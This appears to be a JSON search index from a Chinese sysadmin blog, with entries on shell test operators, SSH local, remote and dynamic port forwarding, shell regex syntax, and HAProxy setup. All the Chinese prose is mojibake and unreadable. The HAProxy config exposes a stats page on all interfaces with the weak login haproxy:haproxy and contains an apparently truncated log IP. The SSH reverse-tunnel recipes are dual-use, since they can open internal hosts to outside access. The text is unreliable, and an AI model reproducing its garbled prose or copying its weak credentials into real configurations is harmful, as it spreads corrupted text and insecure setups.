æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å°äºç­‰äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å›true 8.3. é€»è¾‘è¿ç®—ç¬¦ è¿ç®—ç¬¦(å»ºè®®åœ¨[[]]ä¸­ä½¿ç”¨) è¿ç®—ç¬¦(å»ºè®®åœ¨[]å’Œtestä¸­ä½¿ç”¨) è¯´æ˜ ! ! éè¿ç®—ï¼Œè¡¨è¾¾å¼ä¸ºtrueï¼Œåˆ™è¿”å›falseï¼Œå¦åˆ™è¿”å›true; ä¾‹: [!false]è¿”å›true || -o æˆ–è¿ç®—ï¼Œæœ‰ä¸€ä¸ªè¡¨","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:0:0","tags":["linux","shellscript"],"title":"Shellscriptç›¸å…³","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":"Sshéš§é“ç›¸å…³ï¼Œç«¯å£è½¬å‘","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/","tags":["linux","ssh"],"title":"Sshéš§é“ç›¸å…³","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":"1. è®°å½•ä¸€ä¸ªè‰ç¨¿ å‚è€ƒæ–‡çŒ® : http://www.zsythink.net/archives/2450 http://codelife.me/blog/2012/12/09/three-types-of-ssh-turneling/ https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html ä¸»æœºå®šä¹‰ : serverA: 10.0.1.11 serverB: 10.0.1.12 serverC: 172.16.110.11 serverD: 172.16.110.12 2. æœ¬åœ°è½¬å‘ å‘½ä»¤æ ¼å¼ ssh -L \u003clocal port\u003e:\u003cremote host\u003e:\u003cremote port\u003e \u003cSSH hostname\u003e 2.1. éš§é“æ­å»º(serverA æ‰§è¡Œ) # -L è¡¨ç¤ºä½¿ç”¨æœ¬åœ°è½¬å‘å»ºç«‹éš§é“ # -N è¡¨ç¤ºä¸æ‰§è¡Œè¿œç¨‹å‘½ä»¤ # -f è¡¨ç¤ºè¿è¡Œåˆ°åå° # -g å¼€å¯ç½‘å…³åŠŸèƒ½,serverAä¸­çš„æ‰€æœ‰ipéƒ½å°†ä¼šè¢«ç›‘æ§ # æ•´æ®µæ„æ€è¡¨ç¤º åœ¨æœ¬åœ°(serverA)ä¸»æœºä¸Šå»ºè®¾ä¸€ä¸ªåˆ°serverBçš„éš§é“,ä½¿ç”¨æœ¬åœ°ç«¯å£è½¬å‘æ¨¡å¼,ç›‘å¬æœ¬åœ°(serverA)çš„9022ç«¯å£,å½“è®¿é—®æœ¬åœ°(serverA)çš„9022ç«¯å£æ—¶,ä¼šå°†é€šä¿¡æ•°æ®è½¬å‘åˆ°serverBçš„22ç«¯å£ [root@00 ~]# ssh -N -f -L 9022:10.0.1.12:22 root@10.0.1.12 # ssh -N -f -L 127.0.0.1:9022:10.0.1.12:22 root@10.0.1.12 2.2. éš§é“è¿æ¥(serverA æ‰§è¡Œ) ssh root@127.0.0.1 -P9022 3. è¿œç¨‹ç«¯å£è½¬å‘ (å†…ç½‘ç©¿é€) ä¾‹å¦‚: serverB å¯ä»¥è¿æ¥serverC, ä½†serverC ä¸èƒ½è®¿é—®serverB , serverC å’Œ serverD å¯ä»¥ç›¸äº’è®¿é—®,è‹¥ serverD(æˆ–serverC) éœ€è¦è®¿é—®serverBçš„sshæœåŠ¡ å‘½ä»¤æ ¼å¼ ssh -R \u003clocal port\u003e:\u003cremote host\u003e:\u003cremote port\u003e \u003cSSH hostname\u003e 3.1. éš§é“æ­å»º(serverB æ‰§è¡Œ) # -N è¡¨ç¤ºä¸æ‰§è¡Œè¿œç¨‹å‘½ä»¤ # -R è¡¨ç¤ºåˆ›å»ºè¿œç¨‹è½¬å‘çš„sshéš§é“ # serverB(10.0.1.12)ä¸Šæ‰§è¡Œ ,å°†ä¼šåœ¨è¿œç¨‹ä¸»æœºserverC(172.16.110.11)ä¸Šç”Ÿæˆéš§é“ç«¯å£(9022)çš„ç›‘å¬ ssh -N -R 9022:10.0.1.12:22 root@172.16.110.11 # serverB(10.0.1.12)ä¸Šæ‰§è¡Œ ,å°†ä¼šåœ¨è¿œç¨‹ä¸»æœºserverC(172.16.110.11)ä¸Šç”Ÿæˆéš§é“ç«¯å£(9023)çš„ç›‘å¬ ssh -N -R 9023:10.0.1.11:22 root@172.16.110.11 3.2. éš§é“è¿æ¥ # åœ¨serverC(172.16.110.11) ä¸Šæ‰§è¡Œ,å°†ä¼šç™»é™†serverB(10.0.1.12)ä¸»æœº ssh root@127.0.0.1 -P9022 # åœ¨serverC(172.16.110.11) ä¸Šæ‰§è¡Œ,å°†ä¼šç™»é™†serverA(10.0.1.11)ä¸»æœº ssh root@127.0.0.1 -P9023 4. åŠ¨æ€ç«¯å£è½¬å‘ æœ‰ç‚¹ç±»ä¼¼shadowsocks å‘½ä»¤æ ¼å¼ ssh -D \u003clocal port\u003e \u003cSSH Server\u003e 4.1. éš§é“æ­å»º(serverA æ‰§è¡Œ) [root@00 ~]# ssh -N -D 9000 root@serverC # ssh -N -D 127.0.0.1:9000 root@serverC 4.2. éš§é“è¿æ¥ (serverA æ‰§è¡Œ) (è‹¥serverCä¸ºå…¬ç½‘ip,ä¹Ÿå¯é€šè¿‡å…¶ipè®¿é—®å…¬ç½‘ç½‘ç»œ) ç„¶åé€šè¿‡ ProxyChains-NGæˆ–å…¶ä»–ç¨‹åºé…ç½® socks4æˆ–socks5å³å¯é€šè¿‡serverC è¿æ¥serverCåŒç½‘æ®µçš„å…¶ä»–ä¸»æœº(serverD) 5. windows ç«¯å£è½¬å‘ plink.exeæ˜¯puttyçš„é™„å±å·¥å…· . $\u003e plink.exe -ssh -i sshrsa.ppk 9022:10.0.1.12:22 root@10.0.1.12 ","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/:0:0","tags":["linux","ssh"],"title":"Sshéš§é“ç›¸å…³","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":"æ­£åˆ™è¡¨è¾¾å¼","date":"2019-04-28","objectID":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","tags":["linux","æ­£åˆ™","è§£å†³æ–¹æ¡ˆ"],"title":"æ­£åˆ™è¡¨è¾¾å¼ä»‹ç»","uri":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":" å‰è¨€ æœ€è¿‘åœ¨å†™ä¸€ä¸ªè„šæœ¬,éœ€è¦ä½¿ç”¨åˆ°æ­£åˆ™è¡¨è¾¾å¼,ä½œä¸ºæ›¾ç»çš„ä¸€ä¸ªå¼€å‘,æ­£åˆ™è¿˜æ˜¯çŸ¥é“ä¸€äº›çš„,ä½†æ˜¯å†™ç€å†™ç€å‘ç°ä¸å¯¹,ä½†åœ¨æµ‹è¯•å™¨é‡Œé¢,æ­£åˆ™åˆæ˜¯æ­£ç¡®çš„,è™½ç„¶ç›´åˆ°shellæ­£åˆ™å¹¶ä¸æ˜¯æ ‡å‡†çš„perlæ­£åˆ™,ä½†ä¹Ÿä¸€ç›´æ²¡æœ‰æŸ¥è¯¢åˆ°åˆ°åº•é‚£äº›æ”¯æŒ,é‚£äº›ä¸æ”¯æŒ,ç¿»äº†å¾ˆä¹…ç»ˆäºåœ¨googleä¸Šæ‰¾åˆ°äº†ä¸€ç¯‡ä»‹ç»è¿™äº›åŒºåˆ«çš„æ–‡ç« ,æ­¤å¤„è®°å½•ä¸‹,ä»¥å¤‡æŸ¥éªŒã€‚ åŸæ–‡æ¥æº http://man.linuxde.net/docs/shell_regex.html å¼•å…¥æ‰©å±• https://tool.oschina.net/uploads/apidocs/jquery/regexp.html 1. æ­£åˆ™è¡¨è¾¾å¼çš„åˆ†ç±» åŸºæœ¬çš„æ­£åˆ™è¡¨è¾¾å¼ï¼ˆBasic Regular Expression åˆå«Basic RegEx ç®€ç§°BREsï¼‰ æ‰©å±•çš„æ­£åˆ™è¡¨è¾¾å¼ï¼ˆExtended Regular Expression åˆå«Extended RegEx ç®€ç§°EREsï¼‰ Perlçš„æ­£åˆ™è¡¨è¾¾å¼ï¼ˆPerl Regular Expression åˆå«Perl RegEx ç®€ç§°PREsï¼‰ 2. åŸºæœ¬ç»„æˆéƒ¨åˆ† æ­£åˆ™è¡¨è¾¾å¼çš„åŸºæœ¬ç»„æˆéƒ¨åˆ†ã€‚ æ­£åˆ™è¡¨è¾¾å¼ æè¿° ç¤ºä¾‹ Basic RegEx Extended RegEx Python RegEx Perl regEx \\ è½¬ä¹‰ç¬¦ï¼Œå°†ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œå¿½ç•¥å…¶ç‰¹æ®Šæ„ä¹‰ a\\.båŒ¹é…a.bï¼Œä½†ä¸èƒ½åŒ¹é…ajbï¼Œ.è¢«è½¬ä¹‰ä¸ºç‰¹æ®Šæ„ä¹‰ \\ \\ \\ \\ ^ åŒ¹é…è¡Œé¦–ï¼Œawkä¸­ï¼Œ^åˆ™æ˜¯åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹ ^tuxåŒ¹é…ä»¥tuxå¼€å¤´çš„è¡Œ ^ ^ ^ ^ $ åŒ¹é…è¡Œå°¾ï¼Œawkä¸­ï¼Œ$åˆ™æ˜¯åŒ¹é…å­—ç¬¦ä¸²çš„ç»“å°¾ tux$åŒ¹é…ä»¥tuxç»“å°¾çš„è¡Œ $ $ $ $ . åŒ¹é…é™¤æ¢è¡Œç¬¦\\nä¹‹å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œawkä¸­åˆ™å¯ä»¥ ab.åŒ¹é…abcæˆ–ab+ï¼Œä¸å¯åŒ¹é…abcdæˆ–abdeï¼Œåªèƒ½åŒ¹é…å•å­—ç¬¦ . . . . [] åŒ¹é…åŒ…å«åœ¨[å­—ç¬¦]ä¹‹ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ coo[kl]å¯ä»¥åŒ¹é…cookæˆ–cool [] [] [] [] [^] åŒ¹é…[^å­—ç¬¦]ä¹‹å¤–çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ 123[^45]ä¸å¯ä»¥åŒ¹é…1234æˆ–1235ï¼Œä½†1231ã€1232ã€1236ã€1237å¯ä»¥ [^] [^] [^] [^] [-] åŒ¹é…[]ä¸­æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œè¦å†™æˆé€’å¢ [0-9]å¯ä»¥åŒ¹é…1ã€2æˆ–3ç­‰å…¶ä¸­ä»»æ„ä¸€ä¸ªæ•°å­— [-] [-] [-] [-] ? åŒ¹é…ä¹‹å‰çš„é¡¹1æ¬¡æˆ–è€…0æ¬¡ colou?rå¯ä»¥åŒ¹é…coloræˆ–è€…colourï¼Œä¸èƒ½åŒ¹é…colouur ä¸æ”¯æŒ ? ? ? + åŒ¹é…ä¹‹å‰çš„é¡¹1æ¬¡æˆ–è€…å¤šæ¬¡ sa-6+åŒ¹é…sa-6ã€sa-666ï¼Œä¸èƒ½åŒ¹é…sa- ä¸æ”¯æŒ + + + * åŒ¹é…ä¹‹å‰çš„é¡¹0æ¬¡æˆ–è€…å¤šæ¬¡ co*låŒ¹é…clã€colã€coolã€cooolç­‰ * * * * () åŒ¹é…è¡¨è¾¾å¼ï¼Œåˆ›å»ºä¸€ä¸ªç”¨äºåŒ¹é…çš„å­ä¸² ma(tri)?åŒ¹é…maxæˆ–maxtrix ä¸æ”¯æŒ () () () {n} åŒ¹é…ä¹‹å‰çš„é¡¹næ¬¡ï¼Œnæ˜¯å¯ä»¥ä¸º0çš„æ­£æ•´æ•° [0-9]{3}åŒ¹é…ä»»æ„ä¸€ä¸ªä¸‰ä½æ•°ï¼Œå¯ä»¥æ‰©å±•ä¸º[0-9][0-9][0-9] ä¸æ”¯æŒ {n} {n} {n} {n,} ä¹‹å‰çš„é¡¹è‡³å°‘éœ€è¦åŒ¹é…næ¬¡ [0-9]{2,}åŒ¹é…ä»»æ„ä¸€ä¸ªä¸¤ä½æ•°æˆ–æ›´å¤šä½æ•° ä¸æ”¯æŒ {n,} {n,} {n,} {n,m} æŒ‡å®šä¹‹å‰çš„é¡¹è‡³å°‘åŒ¹é…næ¬¡ï¼Œæœ€å¤šåŒ¹é…mæ¬¡ï¼Œn\u003c=m [0-9]{2,5}åŒ¹é…ä»ä¸¤ä½æ•°åˆ°äº”ä½æ•°ä¹‹é—´çš„ä»»æ„ä¸€ä¸ªæ•°å­— ä¸æ”¯æŒ {n,m} {n,m} {n,m} ` ` äº¤æ›¿åŒ¹é… ä¸¤è¾¹çš„ä»»æ„ä¸€é¡¹`ab(c d)åŒ¹é…abcæˆ–abd` ä¸æ”¯æŒ ` 3. POSIXå­—ç¬¦ç±» POSIXå­—ç¬¦ç±»æ˜¯ä¸€ä¸ªå½¢å¦‚[:...:]çš„ç‰¹æ®Šå…ƒåºåˆ—ï¼ˆmeta sequenceï¼‰ï¼Œä»–å¯ä»¥ç”¨äºåŒ¹é…ç‰¹å®šçš„å­—ç¬¦èŒƒå›´ã€‚ æ­£åˆ™è¡¨è¾¾å¼ æè¿° ç¤ºä¾‹ Basic RegEx Extended RegEx Python RegEx Perl regEx [:alnum:] åŒ¹é…ä»»æ„ä¸€ä¸ªå­—æ¯æˆ–æ•°å­—å­—ç¬¦ [[:alnum:]]+ [:alnum:] [:alnum:] [:alnum:] [:alnum:] [:alpha:] åŒ¹é…ä»»æ„ä¸€ä¸ªå­—æ¯å­—ç¬¦ï¼ˆåŒ…æ‹¬å¤§å°å†™å­—æ¯ï¼‰ [[:alpha:]]{4} [:alpha:] [:alpha:] [:alpha:] [:alpha:] [:blank:] ç©ºæ ¼ä¸åˆ¶è¡¨ç¬¦ï¼ˆæ¨ªå‘å’Œçºµå‘ï¼‰ [[:blank:]]* [:blank:] [:blank:] [:blank:] [:blank:] [:digit:] åŒ¹é…ä»»æ„ä¸€ä¸ªæ•°å­—å­—ç¬¦ [[:digit:]]? [:digit:] [:digit:] [:digit:] [:digit:] [:lower:] åŒ¹é…å°å†™å­—æ¯ [[:lower:]]{5,} [:lower:] [:lower:] [:lower:] [:lower:] [:upper:] åŒ¹é…å¤§å†™å­—æ¯ ([[:upper:]]+)? [:upper:] [:upper:] [:upper:] [:upper:] [:punct:] åŒ¹é…æ ‡ç‚¹ç¬¦å· [[:punct:]] [:punct:] [:punct:] [:punct:] [:punct:] [:space:] åŒ¹é…ä¸€ä¸ªåŒ…æ‹¬æ¢è¡Œç¬¦ã€å›è½¦ç­‰åœ¨å†…çš„æ‰€æœ‰ç©ºç™½ç¬¦ [[:space:]]+ [:space:] [:space:] [:space:] [:space:] [:graph:] åŒ¹é…ä»»ä½•ä¸€ä¸ªå¯ä»¥çœ‹å¾—è§çš„ä¸”å¯ä»¥æ‰“å°çš„å­—ç¬¦ [[:graph:]] [:graph:] [:graph:] [:graph:] [:graph:] [:xdigit:] ä»»ä½•ä¸€ä¸ªåå…­è¿›åˆ¶æ•°ï¼ˆå³ï¼š0-9ï¼Œa-fï¼ŒA-Fï¼‰ [[:xdigit:]]+ [:xdigit:] [:xdigit:] [:xdigit:] [:xdigit:] [:cntrl:] ä»»ä½•ä¸€ä¸ªæ§åˆ¶å­—ç¬¦ï¼ˆASCIIå­—ç¬¦é›†ä¸­çš„å‰32ä¸ªå­—ç¬¦) [[:cntrl:]] [:cntrl:] [:cntrl:] [:cntrl:] [:cntrl:] [:print:] ä»»ä½•ä¸€ä¸ªå¯ä»¥æ‰“å°çš„å­—ç¬¦ [[:print:]] [:print:] [:print:] [:print:] [:print:] 4. å…ƒå­—ç¬¦ å…ƒå­—ç¬¦ï¼ˆmeta characterï¼‰æ˜¯ä¸€ç§Perlé£æ ¼çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œåªæœ‰ä¸€éƒ¨åˆ†æ–‡æœ¬å¤„ç†å·¥å…·æ”¯æŒå®ƒï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„æ–‡æœ¬å¤„ç†å·¥å…·éƒ½æ”¯æŒã€‚ æ­£åˆ™è¡¨è¾¾å¼ æè¿° ç¤ºä¾‹ Basic RegEx Extended RegEx Python RegEx Perl regEx \\b å•è¯è¾¹ç•Œ \\bcool\\b åŒ¹é…coolï¼Œä¸åŒ¹é…coolant \\b \\b \\b \\b \\B éå•è¯è¾¹ç•Œ cool\\B åŒ¹é…coolantï¼Œä¸åŒ¹é…cool \\B \\B \\B \\B \\d å•ä¸ªæ•°å­—å­—ç¬¦ b\\db åŒ¹é…b2bï¼Œä¸åŒ¹é…bcb ä¸æ”¯æŒ ä¸æ”¯æŒ \\d \\d \\D å•ä¸ªéæ•°å­—å­—ç¬¦ b\\Db åŒ¹é…bcbï¼Œä¸åŒ¹é…b2b ä¸æ”¯æŒ ä¸æ”¯æŒ \\D \\D \\w å•ä¸ªå•è¯å­—ç¬¦ï¼ˆå­—æ¯ã€æ•°å­—ä¸_ï¼‰ \\w åŒ¹é…1æˆ–aï¼Œä¸åŒ¹é…\u0026 \\w \\w \\w \\w \\W å•ä¸ªéå•è¯å­—ç¬¦ \\W åŒ¹é…\u0026ï¼Œä¸åŒ¹é…1æˆ–a \\W \\W \\W \\W \\n æ¢è¡Œç¬¦ \\n åŒ¹é…ä¸€ä¸ªæ–°è¡Œ ä¸æ”¯æŒ ä¸æ”¯æŒ \\n \\n \\s å•ä¸ªç©ºç™½å­—ç¬¦ x\\sx åŒ¹é…x xï¼Œä¸åŒ¹é…xx ä¸æ”¯æŒ ä¸æ”¯æŒ \\s \\s \\S å•ä¸ªéç©ºç™½å­—ç¬¦ x\\S\\x åŒ¹é…xkxï¼Œä¸åŒ¹é…xx ä¸æ”¯æŒ ä¸æ”¯æŒ \\S \\S \\r å›è½¦ \\r åŒ¹é…å›è½¦ ä¸æ”¯æŒ ä¸æ”¯æŒ \\r \\r \\t æ¨ªå‘åˆ¶è¡¨ç¬¦ \\t åŒ¹é…ä¸€ä¸ªæ¨ªå‘åˆ¶è¡¨ç¬¦ ä¸æ”¯æŒ ä¸æ”¯æŒ \\t \\t \\v å‚ç›´åˆ¶è¡¨ç¬¦ \\v åŒ¹é…ä¸€ä¸ªå‚ç›´åˆ¶è¡¨ç¬¦ ä¸æ”¯æŒ ä¸æ”¯æŒ \\v \\v \\f æ¢é¡µç¬¦ \\f åŒ¹é…ä¸€ä¸ªæ¢é¡µç¬¦ ä¸æ”¯æŒ ä¸æ”¯æŒ \\f \\f ","date":"2019-04-28","objectID":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/:0:0","tags":["linux","æ­£åˆ™","è§£å†³æ–¹æ¡ˆ"],"title":"æ­£åˆ™è¡¨è¾¾å¼ä»‹ç»","uri":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"categories":["linux","è¿ç»´è®°äº‹","æ•´ç†æ”¶é›†"],"content":"Haproxyéƒ¨ç½²ä¸å¸¸ç”¨æ“ä½œ","date":"2019-04-12","objectID":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/","tags":["linux","haproxy","åå‘ä»£ç†"],"title":"Haproxyéƒ¨ç½²ä¸å¸¸ç”¨æ“ä½œ","uri":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","è¿ç»´è®°äº‹","æ•´ç†æ”¶é›†"],"content":" æœ¬æ–‡å‚è€ƒä»¥ä¸‹å†…å®¹, ç”±æœ¬ç«™é‡æ–°æ•´ç†éªŒè¯å‘å¸ƒ https://zhang.ge/5125.html https://www.kancloud.cn/tuna_dai_/day01/369367 1. ç®€ä»‹ HAProxyæä¾›é«˜å¯ç”¨æ€§ã€è´Ÿè½½å‡è¡¡ä»¥åŠåŸºäºTCPå’ŒHTTPåº”ç”¨çš„ä»£ç†ï¼Œæ”¯æŒè™šæ‹Ÿä¸»æœºï¼Œå®ƒæ˜¯å…è´¹ã€å¿«é€Ÿå¹¶ä¸”å¯é çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚ HAProxyç‰¹åˆ«é€‚ç”¨äºé‚£äº›è´Ÿè½½ç‰¹å¤§çš„webç«™ç‚¹ï¼Œè¿™äº›ç«™ç‚¹é€šå¸¸åˆéœ€è¦ä¼šè¯ä¿æŒæˆ–ä¸ƒå±‚å¤„ç†ã€‚ HAProxyè¿è¡Œåœ¨å½“å‰çš„ç¡¬ä»¶ä¸Šï¼Œå®Œå…¨å¯ä»¥æ”¯æŒæ•°ä»¥ä¸‡è®¡çš„å¹¶å‘è¿æ¥ã€‚å¹¶ä¸”å®ƒçš„è¿è¡Œæ¨¡å¼ä½¿å¾—å®ƒå¯ä»¥å¾ˆç®€å•å®‰å…¨çš„æ•´åˆè¿›æ‚¨å½“å‰çš„æ¶æ„ä¸­ï¼Œ åŒæ—¶å¯ä»¥ä¿æŠ¤ä½ çš„webæœåŠ¡å™¨ä¸è¢«æš´éœ²åˆ°ç½‘ç»œä¸Šã€‚ HAProxyå®ç°äº†ä¸€ç§äº‹ä»¶é©±åŠ¨, å•ä¸€è¿›ç¨‹æ¨¡å‹ï¼Œæ­¤æ¨¡å‹æ”¯æŒéå¸¸å¤§çš„å¹¶å‘è¿æ¥æ•°ã€‚å¤šè¿›ç¨‹æˆ–å¤šçº¿ç¨‹æ¨¡å‹å—å†…å­˜é™åˆ¶ ã€ç³»ç»Ÿè°ƒåº¦å™¨é™åˆ¶ä»¥åŠæ— å¤„ä¸åœ¨çš„é”é™åˆ¶ï¼Œå¾ˆå°‘èƒ½å¤„ç†æ•°åƒå¹¶å‘è¿æ¥ã€‚äº‹ä»¶é©±åŠ¨æ¨¡å‹å› ä¸ºåœ¨æœ‰æ›´å¥½çš„èµ„æºå’Œæ—¶é—´ç®¡ç†çš„ç”¨æˆ·ç©ºé—´(User-Space) å®ç°æ‰€æœ‰è¿™äº›ä»»åŠ¡ï¼Œæ‰€ä»¥æ²¡æœ‰è¿™äº›é—®é¢˜ã€‚æ­¤æ¨¡å‹çš„å¼Šç«¯æ˜¯ï¼Œåœ¨å¤šæ ¸ç³»ç»Ÿä¸Šï¼Œè¿™äº›ç¨‹åºé€šå¸¸æ‰©å±•æ€§è¾ƒå·®ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆä»–ä»¬å¿…é¡»è¿›è¡Œä¼˜åŒ–ä»¥ ä½¿æ¯ä¸ªCPUæ—¶é—´ç‰‡(Cycle)åšæ›´å¤šçš„å·¥ä½œã€‚ 2. å®‰è£… [root@00 software]# wget https://www.haproxy.org/download/1.8/src/haproxy-1.8.19.tar.gz [root@00 software]# tar -xzvf haproxy-1.8.19.tar.gz [root@00 software]# cd haproxy-1.8.19/ # å®‰è£… # å†…æ ¸ç‰ˆæœ¬ï¼Œä½¿ç”¨uname -ræŸ¥çœ‹å†…æ ¸ï¼Œå¦‚ï¼š2.6.18-371.el5ï¼Œæ­¤æ—¶è¯¥å‚æ•°å°±ä¸ºlinux26ï¼›kernel å¤§äº2.6.28çš„ç”¨ï¼šTARGET=linux2628 [root@00 haproxy-1.8.19]# make TARGET=linux2628 ARCH=x86_64 PREFIX=/opt/haproxy # PREFIX=/opt/haproxy-1.8.19 [root@00 haproxy-1.8.19]# make install PREFIX=/opt/haproxy # PREFIX=/opt/haproxy-1.8.19 [root@00 haproxy-1.8.19]# useradd -u 1012 -M -s /sbin/nologin -d /opt/haproxy haproxy [root@00 haproxy-1.8.19]# chown -R haproxy.haproxy /opt/haproxy-1.8.19 # [root@00 haproxy-1.8.19]# ln -s /opt/haproxy-1.8.19 /opt/haproxy 3. é…ç½® 3.1. è§„åˆ’ç›®å½• # haproxy chroot,éœ€è¦è®¾ç½®æ‰€æœ‰ç”¨æˆ·å‡ä¸å…·æœ‰å†™æƒé™ [root@00 haproxy-1.8.19]# mkdir /opt/haproxy/chroot \u0026\u0026 chmod 440 /opt/haproxy/chroot # ä¸»é…ç½®æ–‡ä»¶ç›®å½• [root@00 haproxy-1.8.19]# mkdir /opt/haproxy/etc # å­é…ç½®æ–‡ä»¶ç›®å½•ï¼Œè§„åˆ’enabled ç›®å½•ä¸º readyç›®å½•å†…æ­£å¼å¯ç”¨çš„è½¯è¿æ¥æ–‡ä»¶ [root@00 haproxy-1.8.19]# mkdir /opt/haproxy/etc/{enabled,ready}/{tcp,http} -p # å®Œæ•´ç›®å½•ç»“æ„ [root@00 haproxy-1.8.19]# tree /opt/haproxy/etc/ /opt/haproxy/etc/ â”œâ”€â”€ enabled â”‚Â â”œâ”€â”€ http â”‚Â â”‚Â â””â”€â”€ example.cfg -\u003e ../../ready/http/example.cfg â”‚Â â””â”€â”€ tcp â”œâ”€â”€ haproxy.cfg â””â”€â”€ ready â”œâ”€â”€ http â”‚Â â””â”€â”€ example.cfg â””â”€â”€ tcp 6 directories, 3 files 3.2. ä¸»é…ç½®æ–‡ä»¶ # current config: /opt/haproxy/etc/haproxy.cfg ###### haproxy è¿›ç¨‹ä¿¡æ¯è®¾ç½® ###### global log 172.10.10. local0 maxconn 4096 #æœ€å¤§è¿æ¥æ•° chroot /opt/haproxy/chroot #chrootè£…å½• pidfile /opt/haproxy/haproxy.pid #haproxy pid stats socket /opt/haproxy/haproxy.sock mode 660 level admin #å®šä¹‰ç»Ÿè®¡ä¿¡æ¯ä¿å­˜çš„ä½ç½®,è®¾ç½®æƒé™660ï¼Œç­‰çº§è®¾ç½®ä¸ºç®¡ç†,é˜²æ­¢ä½¿ç”¨socatä¸socké€šä¿¡æ˜¯æƒé™ä¸å¤Ÿ user haproxy #ç”¨æˆ·nobody group haproxy #ç»„nobody daemon #å®ˆæŠ¤è¿›ç¨‹è¿è¡Œ nbproc 1 #è¿›ç¨‹æ•°é‡ ##### é»˜è®¤é…ç½®ï¼Œå‡å¯é€šè¿‡åç»­è®¾ç½®è¦†ç›–å½“å‰è®¾ç½® ###### defaults log global mode http #7å±‚ http;4å±‚tcp,å¦‚æœè¦è®©haproxyæ”¯æŒè™šæ‹Ÿä¸»æœºï¼Œmode å¿…é¡»è®¾ä¸ºhttp option httplog #è®°å½•haproxy è®¿é—®æ—¥å¿—, http æ—¥å¿—æ ¼å¼ option httpclose #æ¯æ¬¡è¯·æ±‚å®Œæ¯•åä¸»åŠ¨å…³é—­httpé€šé“,haproxyä¸æ”¯æŒkeep-alive,åªèƒ½æ¨¡æ‹Ÿè¿™ç§æ¨¡å¼çš„å®ç° option redispatch #serverIdå¯¹åº”çš„æœåŠ¡å™¨æŒ‚æ‰å,å¼ºåˆ¶å®šå‘åˆ°å…¶ä»–å¥åº·çš„æœåŠ¡å™¨ retries 3 #3æ¬¡è¿æ¥å¤±è´¥å°±è®¤ä¸ºæ˜¯æœåŠ¡å™¨ä¸å¯ç”¨ option dontlognull #æ—¥å¿—ä¸­ä¸è®°å½•ç©ºè¿æ¥,æ¯”å¦‚å¥åº·æ£€æŸ¥æ—¥å¿—ä¿¡æ¯ option forwardfor header X-REAL-IP # è½¬å‘ç”¨æˆ·çœŸå®ip maxconn 2000 #æœ€å¤§è¿æ¥æ•°ï¼Œå—ç³»ç»Ÿulimit è®¾ç½®å½±å“ timeout connect 3600000 #è¿æ¥è¶…æ—¶(æ¯«ç§’) timeout client 3600000 #å®¢æˆ·ç«¯è¶…æ—¶(æ¯«ç§’) timeout server 3600000 #æœåŠ¡å™¨è¶…æ—¶(æ¯«ç§’) listen stats bind 0.0.0.0:8888 stats enable # æ˜¾ç¤ºçŠ¶æ€é¡µé¢ stats hide-version # éšè— haproxy ç‰ˆæœ¬å· stats refresh 30s # é¡µé¢è‡ªåŠ¨åˆ·æ–°æ—¶é—´ stats uri /haproxy-status # ç»Ÿè®¡é¡µé¢url stats realm hello\\ haproxy #ç»Ÿè®¡é¡µé¢å¯†ç æ¡†ä¸Šæç¤ºæ–‡æœ¬ stats auth haproxy:haproxy # è®¾ç½®ç›‘æ§é¡µé¢çš„ç”¨æˆ·å’Œå¯†ç ï¼Œå¯ä»¥è®¾ç½®å¤šä¸ª #stats auth haproxy:haproxy 3.3. å­é…ç½® # current config: /opt/haproxy/etc/ready/http/example.cfg ###### å‰ç«¯é…ç½® ###### frontend frontend_www.example.com_1 # bind 0.0.0.0:5000 mode http # acl url_static path_beg -i /static /images /javascript /stylesheets # acl url_static path_end -i .jpg .gif .png .css .js # use_backend static if url_static # è¯·æ±‚è½¬å‘åˆ°é‚£ä¸ªåç«¯ default_backend backend_www.example.com_1 #--------------------------------------------------------------------- # static backend for serving up images, stylesheets and such #--------------------------------------------------------------------- ###### åç«¯é…ç½® ###### backend backend_www.example.com_1 option forwardfor header X-REAL-IP # å¥åº·æ£€æŸ¥ï¼Œå‘é€ä¸€ä¸ªHEADè¯·æ±‚ï¼ŒéªŒè¯èŠ‚ç‚¹æ˜¯å¦å­˜æ´» option httpchk HEAD / HTTP/1.0 # 